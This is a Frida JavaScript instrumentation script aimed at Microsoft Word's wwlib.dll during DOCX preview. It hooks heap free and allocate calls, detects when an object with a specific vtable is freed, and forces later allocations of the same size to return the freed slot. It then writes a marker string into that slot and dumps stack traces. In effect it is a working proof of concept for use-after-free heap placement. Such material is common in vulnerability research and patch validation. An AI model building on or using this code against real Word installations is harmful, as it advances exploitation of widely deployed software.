// frida-placement.js
// Active placement control via payload vtable + RtlAllocateHeap

var ntdll = Process.findModuleByName("ntdll.dll");
if (!ntdll) {
  console.log("[!] ntdll.dll not found");
  Process.exit(1);
}

var RtlFreeHeap = ntdll.getExportByName("RtlFreeHeap");
var RtlAllocateHeap = ntdll.getExportByName("RtlAllocateHeap");
var RtlValidateHeap = ntdll.getExportByName("RtlValidateHeap");
console.log("[*] RtlFreeHeap at " + RtlFreeHeap);
console.log("[*] RtlAllocateHeap at " + RtlAllocateHeap);
console.log("[*] RtlValidateHeap at " + RtlValidateHeap);
console.log("[*] Attached PID: " + Process.id);
console.log("[*] FRIDA_SCRIPT_VERSION payload-release-stack-v7");

var PAYLOAD_SIZE = 0x20;
var MAX_REUSE_ATTEMPTS = 64;
var MAX_WWLIB_CALL_TRACE_FRAMES = 64;
var rtlValidateHeap = new NativeFunction(RtlValidateHeap, "int", [
  "pointer",
  "uint",
  "pointer",
]);

// State
var freedPayloadPtr = null;
var freedPayloadHeap = null;
var freedPayloadThreadId = null;
var freedPayloadStackFrames = [];
var freedPayloadWwlibStackScanFrames = [];
var payloadReleaseStackFrames = [];
var payloadReleaseWwlibStackScanFrames = [];
var freedConfirmed = false;
var forceReuse = false;
var reusedPtr = null;
var markerWritten = false;
var hasLoggedReuseStack = false;
var reuseAttempts = 0;
var freeCallStackByThread = {};
var allocationCallStackByThread = {};
var mallocBaseStackByThread = {};
var coTaskMemAllocStackByThread = {};
var wwlibCallTraceByThread = {};
var freeCallCount = 0;
var alloc20CallCount = 0;
var fDisposeCallCount = 0;
var fDisposeLogBudget = 8;
var previewOpenCount = 0;
var docLookupEnterCount = 0;
var docLookupRetCount = 0;
var payloadReleaseCallCount = 0;
var payloadReleaseMatchCount = 0;
var lastDocPtr = ptr("0");
var badCleanupDepth = 0;
var payloadReleaseWindowLogBudget = 32;
var payloadReleaseAfterBadCleanupLogBudget = 0;
var lastBadCleanupDOD = ptr("0");
var wwlibRange = null;
var hasInstalledMallocBaseHook = false;
var hasInstalledCoTaskMemAllocHook = false;

// Wait for wwlib
function waitForWwlib(callback) {
  var module = Process.findModuleByName("wwlib.dll");
  if (module) {
    callback(module);
    return;
  }
  console.log("[*] Waiting for wwlib.dll to load...");
  var interval = setInterval(function () {
    var m = Process.findModuleByName("wwlib.dll");
    if (m) {
      clearInterval(interval);
      console.log("[+] wwlib.dll loaded at " + m.base);
      callback(m);
    }
  }, 200);
}

waitForWwlib(function (wwlib) {
  var wwlibBase = wwlib.base;
  wwlibRange = {
    base: wwlib.base,
    end: wwlib.base.add(wwlib.size),
  };
  var HrOpenPreviewerDoc = wwlibBase.add(0xd96c80);
  var DocLookupEnter = wwlibBase.add(0x508bc0);
  var DocLookupRet = wwlibBase.add(0xd96cf0);
  var FDisposeDocCore = wwlibBase.add(0x8cc38);
  var BadCleanupRet = wwlibBase.add(0xd971cf);
  var PayloadRelease = wwlibBase.add(0x7a140);
  var PayloadVtable = wwlibBase.add(0x2281f60);

  console.log("[*] wwlib base: " + wwlibBase);
  console.log("[*] HrOpenPreviewerDoc at: " + HrOpenPreviewerDoc);
  console.log("[*] DocLookupEnter at: " + DocLookupEnter);
  console.log("[*] DocLookupRet at: " + DocLookupRet);
  console.log("[*] FDisposeDocCore at: " + FDisposeDocCore);
  console.log("[*] BadCleanupRet at: " + BadCleanupRet);
  console.log("[*] PayloadRelease at: " + PayloadRelease);
  console.log("[*] PayloadVtable at: " + PayloadVtable);
  installHeartbeat();
  installWwlibPathDiagnostics(
    HrOpenPreviewerDoc,
    DocLookupEnter,
    DocLookupRet,
    BadCleanupRet,
    PayloadRelease,
    PayloadVtable,
  );
  installCoTaskMemAllocDiagnostics();
  installMallocBaseDiagnostics();

  // Hook RtlFreeHeap to catch payload free by vtable.
  Interceptor.attach(RtlFreeHeap, {
    onEnter: function (args) {
      freeCallCount++;
      var ptr = args[2];
      var threadId = Process.getCurrentThreadId();
      var freeState = {
        payloadPtr: null,
        heap: args[0],
        threadId: threadId,
        payloadStackFrames: [],
        payloadWwlibStackScanFrames: [],
      };

      if (!ptr.isNull()) {
        try {
          var vt = readPointerValue(ptr);
          if (vt.equals(PayloadVtable)) {
            freeState.payloadPtr = ptr;
            freeState.payloadStackFrames = captureBacktraceFrames(this.context);
            freeState.payloadWwlibStackScanFrames =
              scanWwlibStackMemory(this.context);
          }
        } catch (e) {}
      }
      pushCallState(freeCallStackByThread, threadId, freeState);
    },
    onLeave: function (retval) {
      var freeState = popCallState(
        freeCallStackByThread,
        Process.getCurrentThreadId(),
      );
      if (freeState && freeState.payloadPtr && retval.toInt32() !== 0) {
        console.log(
          "[FREE] Payload object freed at " +
            freeState.payloadPtr +
            ", heap=" +
            freeState.heap +
            ", thread=" +
            freeState.threadId,
        );
        freedPayloadPtr = freeState.payloadPtr;
        freedPayloadHeap = freeState.heap;
        freedPayloadThreadId = freeState.threadId;
        freedPayloadStackFrames = freeState.payloadStackFrames;
        freedPayloadWwlibStackScanFrames = freeState.payloadWwlibStackScanFrames;
        freedConfirmed = true;
        forceReuse = false;
        reusedPtr = null;
        markerWritten = false;
        reuseAttempts = 0;
        startWwlibCallTrace(freedPayloadThreadId);
      }
    },
  });

  // Hook FDisposeDocCore only for diagnostics.
  Interceptor.attach(FDisposeDocCore, {
    onEnter: function (args) {
      fDisposeCallCount++;
      var docPtr = args[0];
      var retAddr = this.returnAddress;
      if (fDisposeLogBudget > 0 || retAddr.equals(BadCleanupRet)) {
        fDisposeLogBudget--;
        console.log(
          "[FDISPOSE_ANY] DOD=" +
            docPtr +
            " ret=" +
            retAddr +
            " badCleanup=" +
            retAddr.equals(BadCleanupRet),
        );
      }
      if (retAddr.equals(BadCleanupRet)) {
        badCleanupDepth++;
        payloadReleaseAfterBadCleanupLogBudget = 64;
        lastBadCleanupDOD = docPtr;
        console.log("[FDISPOSE] Bad cleanup detected, DOD=" + docPtr);
      }
    },
  });

  // Hook RtlAllocateHeap to force reuse
  Interceptor.attach(RtlAllocateHeap, {
    onEnter: function (args) {
      var threadId = Process.getCurrentThreadId();
      var size = args[2].toInt32();
      if (size === PAYLOAD_SIZE) {
        alloc20CallCount++;
        installMallocBaseFromAllocatorCaller(this.context);
      }
      var allocationState = {
        size: size,
        heap: args[0],
        flags: args[1],
        threadId: threadId,
      };
      var coTaskMemAllocStack = consumeCoTaskMemAllocStack(
        threadId,
        allocationState,
      );
      var mallocBaseStack = consumeMallocBaseStack(threadId, allocationState);
      var allocatorStack = coTaskMemAllocStack || mallocBaseStack;
      allocationState.reuseStackFrames = allocatorStack
        ? allocatorStack.reuseStackFrames
        : captureReuseStackFrames(allocationState, this.context);
      allocationState.wwlibStackScanFrames = allocatorStack
        ? allocatorStack.wwlibStackScanFrames
        : scanWwlibStackFrames(allocationState, this.context);
      pushCallState(allocationCallStackByThread, threadId, allocationState);
    },
    onLeave: function (retval) {
      var allocationState = popCallState(
        allocationCallStackByThread,
        Process.getCurrentThreadId(),
      );
      if (!allocationState) return;

      var size = allocationState.size;
      if (!freedConfirmed || forceReuse || size !== PAYLOAD_SIZE) return;
      if (!allocationState.heap.equals(freedPayloadHeap)) return;
      if (allocationState.threadId !== freedPayloadThreadId) return;

      if (retval.equals(freedPayloadPtr)) {
        console.log(
          "[ALLOC] Exact reuse observed for " +
            freedPayloadPtr +
            " after " +
            reuseAttempts +
            " miss(es)",
        );
        reuseAttempts = 0;
        markReusedPayloadSlot(
          freedPayloadPtr,
          allocationState.reuseStackFrames,
          allocationState.wwlibStackScanFrames,
          snapshotWwlibCallTrace(allocationState.threadId),
          freedPayloadStackFrames,
          freedPayloadWwlibStackScanFrames,
          payloadReleaseStackFrames,
          payloadReleaseWwlibStackScanFrames,
        );
        stopWwlibCallTrace(allocationState.threadId);
        return;
      }

      reuseAttempts++;
      if (!isFreedPayloadSlotReadable()) {
        console.log(
          "[!] Freed payload slot is no longer free/readable: " +
            freedPayloadPtr,
        );
        Process.exit(1);
      }

      if (reuseAttempts >= MAX_REUSE_ATTEMPTS) {
        console.log(
          "[!] Exact reuse did not occur after " +
            MAX_REUSE_ATTEMPTS +
            " matching attempt(s)",
        );
        Process.exit(1);
      }

      console.log(
        "[ALLOC] RtlAllocateHeap(size=0x" +
          size.toString(16) +
          ") original ret=" +
          retval +
          ", forcing reuse of " +
          freedPayloadPtr +
          ", consecutive_miss=" +
          reuseAttempts +
          "/" +
          MAX_REUSE_ATTEMPTS,
      );
      retval.replace(freedPayloadPtr);
      markReusedPayloadSlot(
        freedPayloadPtr,
        allocationState.reuseStackFrames,
        allocationState.wwlibStackScanFrames,
        snapshotWwlibCallTrace(allocationState.threadId),
        freedPayloadStackFrames,
        freedPayloadWwlibStackScanFrames,
        payloadReleaseStackFrames,
        payloadReleaseWwlibStackScanFrames,
      );
      stopWwlibCallTrace(allocationState.threadId);
    },
  });

  console.log("[*] Frida placement control script fully loaded.");
  console.log("[*] Now open a DOCX with comment and trigger Preview Handler.");
});

function installHeartbeat() {
  setInterval(function () {
    console.log(
      "[FRIDA_HEARTBEAT] pid=" +
        Process.id +
        " frees=" +
        freeCallCount +
        " alloc20=" +
        alloc20CallCount +
        " fdispose=" +
        fDisposeCallCount +
        " previewOpen=" +
        previewOpenCount +
        " docLookup=" +
        docLookupEnterCount +
        "/" +
        docLookupRetCount +
        " payloadRelease=" +
        payloadReleaseMatchCount +
        "/" +
        payloadReleaseCallCount +
        " badCleanupDepth=" +
        badCleanupDepth +
        " postBadCleanupReleaseBudget=" +
        payloadReleaseAfterBadCleanupLogBudget +
        " freedConfirmed=" +
        freedConfirmed +
        " reuseAttempts=" +
        reuseAttempts,
    );
  }, 5000);
}

function installWwlibPathDiagnostics(
  hrOpenPreviewerDoc,
  docLookupEnter,
  docLookupRet,
  badCleanupRet,
  payloadRelease,
  payloadVtable,
) {
  Interceptor.attach(hrOpenPreviewerDoc, {
    onEnter: function (args) {
      previewOpenCount++;
      console.log(
        "[FRIDA_HROPEN_PREVIEWER_DOC_ENTER] rcx=" +
          args[0] +
          " rdx=" +
          args[1],
      );
    },
  });

  Interceptor.attach(docLookupEnter, {
    onEnter: function (args) {
      docLookupEnterCount++;
      console.log("[FRIDA_DOC_LOOKUP_ENTER] rcx=" + args[0]);
      try {
        console.log("[FRIDA_DOC_LOOKUP_PATH] " + args[0].readUtf16String());
      } catch (e) {
        console.log("[FRIDA_DOC_LOOKUP_PATH] <unreadable: " + e + ">");
      }
    },
  });

  Interceptor.attach(docLookupRet, {
    onEnter: function () {
      docLookupRetCount++;
      lastDocPtr = this.context.rax;
      console.log("[FRIDA_DOC_LOOKUP_RET] retval=" + lastDocPtr);
    },
  });

  Interceptor.attach(badCleanupRet, {
    onEnter: function () {
      if (badCleanupDepth > 0) {
        badCleanupDepth--;
      }
      console.log("[FRIDA_BAD_CLEANUP_RET] depth=" + badCleanupDepth);
    },
  });

  Interceptor.attach(payloadRelease, {
    onEnter: function (args) {
      payloadReleaseCallCount++;
      var obj = args[0];
      try {
        var vt = readPointerValue(obj);
        var shouldLogWindowRelease =
          badCleanupDepth > 0 && payloadReleaseWindowLogBudget > 0;
        var shouldLogPostCleanupRelease =
          payloadReleaseAfterBadCleanupLogBudget > 0;
        if (shouldLogWindowRelease || shouldLogPostCleanupRelease) {
          if (shouldLogWindowRelease) {
            payloadReleaseWindowLogBudget--;
          }
          if (shouldLogPostCleanupRelease) {
            payloadReleaseAfterBadCleanupLogBudget--;
          }
          console.log(
            "[FRIDA_PAYLOAD_RELEASE_WINDOW] ptr=" +
              obj +
              " vt=" +
              vt +
              " expected=" +
              payloadVtable +
              " matches=" +
              vt.equals(payloadVtable) +
              " badCleanupDepth=" +
              badCleanupDepth +
              " lastBadCleanupDOD=" +
              lastBadCleanupDOD,
          );
        }
        if (vt.equals(payloadVtable)) {
          payloadReleaseMatchCount++;
          payloadReleaseStackFrames = captureBacktraceFrames(this.context);
          payloadReleaseWwlibStackScanFrames = scanWwlibStackMemory(
            this.context,
          );
          console.log(
            "[FRIDA_PAYLOAD_RELEASE_ENTER] ptr=" +
              obj +
              " vt=" +
              vt +
              " lastDoc=" +
              lastDocPtr +
              " stackFrames=" +
              payloadReleaseStackFrames.length +
              " wwlibStackScanFrames=" +
              payloadReleaseWwlibStackScanFrames.length,
          );
        }
      } catch (e) {
        if (payloadReleaseAfterBadCleanupLogBudget > 0) {
          payloadReleaseAfterBadCleanupLogBudget--;
          console.log(
            "[FRIDA_PAYLOAD_RELEASE_UNREADABLE] ptr=" +
              obj +
              " error=" +
              e +
              " badCleanupDepth=" +
              badCleanupDepth +
              " lastBadCleanupDOD=" +
              lastBadCleanupDOD,
          );
        }
      }
    },
  });
}

function installMallocBaseDiagnostics() {
  var mallocBase = resolveMallocBaseAddress();
  if (!mallocBase || mallocBase.isNull()) {
    console.log("[MALLOC_BASE] not found by symbol name; will learn from allocator caller");
    return;
  }

  attachMallocBaseHook(mallocBase, "symbol");
}

function installCoTaskMemAllocDiagnostics() {
  var coTaskMemAlloc = resolveCoTaskMemAllocAddress();
  if (!coTaskMemAlloc || coTaskMemAlloc.isNull()) {
    console.log("[COTASKMEMALLOC] not found");
    return;
  }

  hasInstalledCoTaskMemAllocHook = true;
  console.log("[COTASKMEMALLOC] hooked at " + coTaskMemAlloc);
  Interceptor.attach(coTaskMemAlloc, {
    onEnter: function (args) {
      if (args[0].toInt32() !== PAYLOAD_SIZE) return;

      var threadId = Process.getCurrentThreadId();
      if (!freedConfirmed || forceReuse || threadId !== freedPayloadThreadId) {
        return;
      }

      console.log("[COTASKMEMALLOC_CAPTURE] thread=" + threadId);
      coTaskMemAllocStackByThread[String(threadId)] = {
        reuseStackFrames: captureBacktraceFrames(this.context),
        wwlibStackScanFrames: scanWwlibStackMemory(this.context),
      };
    },
  });
}

function resolveCoTaskMemAllocAddress() {
  var moduleNames = ["ole32.dll", "combase.dll"];
  for (var index = 0; index < moduleNames.length; index++) {
    try {
      var module = Process.findModuleByName(moduleNames[index]);
      if (!module) continue;

      var address = module.getExportByName("CoTaskMemAlloc");
      if (address && !address.isNull()) {
        return address;
      }
    } catch (e) {}
  }

  try {
    var symbolAddress = DebugSymbol.fromName("CoTaskMemAlloc");
    if (symbolAddress && !symbolAddress.isNull()) {
      return symbolAddress;
    }
  } catch (e) {}

  return ptr("0");
}

function installMallocBaseFromAllocatorCaller(context) {
  if (hasInstalledMallocBaseHook) return;

  var frames = captureBacktraceFrames(context);
  for (var index = 0; index < frames.length; index++) {
    var sym = DebugSymbol.fromAddress(frames[index]);
    if (sym.moduleName !== "WINWORD.EXE") continue;
    if (String(sym.name).indexOf("malloc_base") === -1) continue;

    attachMallocBaseHook(frames[index], "allocator caller");
    return;
  }
}

function attachMallocBaseHook(mallocBase, source) {
  if (hasInstalledMallocBaseHook) return;

  hasInstalledMallocBaseHook = true;
  console.log("[MALLOC_BASE] hooked at " + mallocBase + " source=" + source);
  var hasTrustedSizeArgument = source === "symbol";
  Interceptor.attach(mallocBase, {
    onEnter: function (args) {
      if (hasTrustedSizeArgument && args[0].toInt32() !== PAYLOAD_SIZE) {
        return;
      }

      var threadId = Process.getCurrentThreadId();
      if (!freedConfirmed || forceReuse || threadId !== freedPayloadThreadId) {
        return;
      }

      console.log("[MALLOC_BASE_CAPTURE] thread=" + threadId + " source=" + source);
      mallocBaseStackByThread[String(threadId)] = {
        reuseStackFrames: captureBacktraceFrames(this.context),
        wwlibStackScanFrames: scanWwlibStackMemory(this.context),
      };
    },
  });
}

function resolveMallocBaseAddress() {
  var names = ["WINWORD.EXE!malloc_base", "malloc_base"];
  for (var index = 0; index < names.length; index++) {
    try {
      var address = DebugSymbol.fromName(names[index]);
      if (address && !address.isNull()) {
        return address;
      }
    } catch (e) {}
  }
  return ptr("0");
}

function consumeMallocBaseStack(threadId, allocationState) {
  if (!isReuseCandidateAllocation(allocationState)) return null;

  var key = String(threadId);
  var stack = mallocBaseStackByThread[key] || null;
  delete mallocBaseStackByThread[key];
  return stack;
}

function consumeCoTaskMemAllocStack(threadId, allocationState) {
  if (!isReuseCandidateAllocation(allocationState)) return null;

  var key = String(threadId);
  var stack = coTaskMemAllocStackByThread[key] || null;
  delete coTaskMemAllocStackByThread[key];
  return stack;
}

function pushCallState(callStacksByThread, threadId, callState) {
  var key = String(threadId);
  if (!callStacksByThread[key]) {
    callStacksByThread[key] = [];
  }
  callStacksByThread[key].push(callState);
}

function popCallState(callStacksByThread, threadId) {
  var key = String(threadId);
  var callStack = callStacksByThread[key];
  if (!callStack || callStack.length === 0) {
    return null;
  }

  var callState = callStack.pop();
  if (callStack.length === 0) {
    delete callStacksByThread[key];
  }
  return callState;
}

function markReusedPayloadSlot(
  ptr,
  reuseStackFrames,
  wwlibStackScanFrames,
  wwlibCallTraceFrames,
  payloadFreeStackFrames,
  payloadFreeWwlibStackScanFrames,
  payloadReleaseStackFrames,
  payloadReleaseWwlibStackScanFrames,
) {
  reusedPtr = ptr;
  forceReuse = true;
  freedConfirmed = false;
  try {
    writeUtf8StringValue(reusedPtr, "TBL_41414141");
    console.log("[WRITE] Marker 'TBL_41414141' written to " + reusedPtr);
    markerWritten = true;
    console.log("[DUMP]");
    console.log(hexdump(reusedPtr, { offset: 0, length: 32 }));
    if (!hasLoggedReuseStack) {
      logReuseStack(
        reuseStackFrames,
        wwlibStackScanFrames,
        wwlibCallTraceFrames,
        payloadFreeStackFrames,
        payloadFreeWwlibStackScanFrames,
        payloadReleaseStackFrames,
        payloadReleaseWwlibStackScanFrames,
      );
    }
  } catch (e) {
    console.log("[!] Failed to write marker: " + e);
  }
}

function logReuseStack(
  reuseStackFrames,
  wwlibStackScanFrames,
  wwlibCallTraceFrames,
  payloadFreeStackFrames,
  payloadFreeWwlibStackScanFrames,
  payloadReleaseStackFrames,
  payloadReleaseWwlibStackScanFrames,
) {
  hasLoggedReuseStack = true;
  try {
    console.log("[STACK]");
    var frames = reuseStackFrames || [];
    if (frames.length === 0) {
      console.log("    <no allocation caller frames captured>");
    } else {
      frames.slice(0, 20).forEach(function (addr) {
        logTraceFrame(addr);
      });
    }
    logWwlibStackScan(wwlibStackScanFrames);
    logWwlibCallTrace(wwlibCallTraceFrames);
    logPayloadFreeStack(payloadFreeStackFrames);
    logPayloadFreeWwlibStackScan(payloadFreeWwlibStackScanFrames);
    logPayloadReleaseStack(payloadReleaseStackFrames);
    logPayloadReleaseWwlibStackScan(payloadReleaseWwlibStackScanFrames);
  } catch (e) {
    console.log("[!] Failed to capture stack: " + e);
  }
}

function startWwlibCallTrace(threadId) {
  if (typeof Stalker === "undefined" || !wwlibRange) return;

  var key = String(threadId);
  if (wwlibCallTraceByThread[key]) return;

  wwlibCallTraceByThread[key] = {
    frames: [],
    seen: {},
  };

  try {
    Stalker.follow(threadId, {
      events: {
        call: true,
      },
      onReceive: function (events) {
        collectWwlibCallTraceEvents(key, events);
      },
    });
    console.log("[WWLIB_CALL_TRACE] started thread=" + threadId);
  } catch (e) {
    console.log("[WWLIB_CALL_TRACE] failed to start: " + e);
    delete wwlibCallTraceByThread[key];
  }
}

function collectWwlibCallTraceEvents(key, events) {
  var trace = wwlibCallTraceByThread[key];
  if (!trace) return;

  try {
    var parsedEvents = Stalker.parse(events);
    parsedEvents.forEach(function (event) {
      if (event[0] !== "call") return;

      var target = event[2];
      if (!target || !isAddressInWwlib(target)) return;

      var targetKey = target.toString();
      if (trace.seen[targetKey]) return;

      trace.seen[targetKey] = true;
      trace.frames.push(target);
      if (trace.frames.length > MAX_WWLIB_CALL_TRACE_FRAMES) {
        trace.frames.shift();
      }
    });
  } catch (e) {
    console.log("[WWLIB_CALL_TRACE] failed to parse events: " + e);
  }
}

function snapshotWwlibCallTrace(threadId) {
  var key = String(threadId);
  try {
    if (typeof Stalker !== "undefined") {
      Stalker.flush();
    }
  } catch (e) {}

  var trace = wwlibCallTraceByThread[key];
  return trace ? trace.frames.slice(0) : [];
}

function stopWwlibCallTrace(threadId) {
  var key = String(threadId);
  if (!wwlibCallTraceByThread[key]) return;

  try {
    Stalker.unfollow(threadId);
    Stalker.garbageCollect();
  } catch (e) {
    console.log("[WWLIB_CALL_TRACE] failed to stop: " + e);
  }
  delete wwlibCallTraceByThread[key];
}

function captureReuseStackFrames(allocationState, context) {
  if (!isReuseCandidateAllocation(allocationState)) return [];
  return captureBacktraceFrames(context);
}

function captureBacktraceFrames(context) {
  var accurateFrames = [];
  try {
    accurateFrames = Thread.backtrace(context, Backtracer.ACCURATE);
  } catch (e) {
    console.log("[!] Accurate backtrace failed: " + e);
  }

  if (accurateFrames.length >= 5) {
    return accurateFrames;
  }

  try {
    var fuzzyFrames = Thread.backtrace(context, Backtracer.FUZZY);
    if (fuzzyFrames.length > accurateFrames.length) {
      return fuzzyFrames;
    }
  } catch (e) {
    console.log("[!] Fuzzy backtrace failed: " + e);
  }

  return accurateFrames;
}

function scanWwlibStackFrames(allocationState, context) {
  if (!isReuseCandidateAllocation(allocationState)) return [];
  return scanWwlibStackMemory(context);
}

function scanWwlibStackMemory(context) {
  if (!wwlibRange || !context || !context.rsp) return [];

  var frames = [];
  var seen = {};
  var stackPointer = context.rsp;
  var maxStackWords = 1024;

  for (var index = 0; index < maxStackWords && frames.length < 20; index++) {
    try {
      var candidate = readPointerValue(stackPointer.add(index * Process.pointerSize));
      if (!isAddressInWwlib(candidate)) continue;

      var key = candidate.toString();
      if (seen[key]) continue;

      seen[key] = true;
      frames.push(candidate);
    } catch (e) {}
  }

  return frames;
}

function logWwlibStackScan(wwlibStackScanFrames) {
  var frames = wwlibStackScanFrames || [];
  if (frames.length === 0) {
    console.log("[STACK_SCAN_WWLIB count=0]");
    console.log("    <no wwlib.dll return addresses found on stack>");
    return;
  }

  console.log("[STACK_SCAN_WWLIB count=" + frames.length + "]");
  frames.slice(0, 20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logWwlibCallTrace(wwlibCallTraceFrames) {
  var frames = wwlibCallTraceFrames || [];
  if (frames.length === 0) {
    console.log("[WWLIB_CALL_TRACE count=0]");
    console.log("    <no wwlib.dll calls observed between free and reuse>");
    return;
  }

  console.log("[WWLIB_CALL_TRACE count=" + frames.length + "]");
  frames.slice(-20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logPayloadFreeStack(payloadFreeStackFrames) {
  var frames = payloadFreeStackFrames || [];
  if (frames.length === 0) {
    console.log("[PAYLOAD_FREE_STACK count=0]");
    console.log("    <no payload free frames captured>");
    return;
  }

  console.log("[PAYLOAD_FREE_STACK count=" + frames.length + "]");
  frames.slice(0, 20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logPayloadFreeWwlibStackScan(payloadFreeWwlibStackScanFrames) {
  var frames = payloadFreeWwlibStackScanFrames || [];
  if (frames.length === 0) {
    console.log("[PAYLOAD_FREE_STACK_SCAN_WWLIB count=0]");
    console.log("    <no wwlib.dll return addresses found during payload free>");
    return;
  }

  console.log("[PAYLOAD_FREE_STACK_SCAN_WWLIB count=" + frames.length + "]");
  frames.slice(0, 20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logPayloadReleaseStack(payloadReleaseStackFrames) {
  var frames = payloadReleaseStackFrames || [];
  if (frames.length === 0) {
    console.log("[PAYLOAD_RELEASE_STACK count=0]");
    console.log("    <no payload release frames captured>");
    return;
  }

  console.log("[PAYLOAD_RELEASE_STACK count=" + frames.length + "]");
  frames.slice(0, 20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logPayloadReleaseWwlibStackScan(payloadReleaseWwlibStackScanFrames) {
  var frames = payloadReleaseWwlibStackScanFrames || [];
  if (frames.length === 0) {
    console.log("[PAYLOAD_RELEASE_STACK_SCAN_WWLIB count=0]");
    console.log("    <no wwlib.dll return addresses found during payload release>");
    return;
  }

  console.log(
    "[PAYLOAD_RELEASE_STACK_SCAN_WWLIB count=" + frames.length + "]",
  );
  frames.slice(0, 20).forEach(function (addr) {
    logTraceFrame(addr);
  });
}

function logTraceFrame(addr) {
  var sym = DebugSymbol.fromAddress(addr);
  var moduleName = sym.moduleName || "<unknown>";
  var wwlibOffset = getWwlibOffset(addr);
  var suffix = wwlibOffset ? " " + wwlibOffset : "";
  console.log("    [" + moduleName + "] " + sym.toString() + suffix);
}

function getWwlibOffset(address) {
  if (!wwlibRange || !isAddressInWwlib(address)) return "";
  return "wwlib+0x" + address.sub(wwlibRange.base).toString(16);
}

function isReuseCandidateAllocation(allocationState) {
  if (!freedConfirmed || forceReuse || allocationState.size !== PAYLOAD_SIZE) {
    return false;
  }
  if (!allocationState.heap.equals(freedPayloadHeap)) return false;
  return allocationState.threadId === freedPayloadThreadId;
}

function isAddressInWwlib(address) {
  return (
    address.compare(wwlibRange.base) >= 0 && address.compare(wwlibRange.end) < 0
  );
}

function isFreedPayloadSlotReadable() {
  if (!freedPayloadHeap || !freedPayloadPtr) return false;
  try {
    var isAllocated =
      rtlValidateHeap(freedPayloadHeap, 0, freedPayloadPtr) !== 0;
    if (isAllocated) {
      console.log("[!] Freed payload slot validates as allocated");
      return false;
    }
    readPointerValue(freedPayloadPtr);
    return true;
  } catch (e) {
    console.log("[!] Failed to validate freed payload slot: " + e);
    return false;
  }
}

function readPointerValue(address) {
  return address.readPointer();
}

function writeUtf8StringValue(address, value) {
  address.writeUtf8String(value);
}
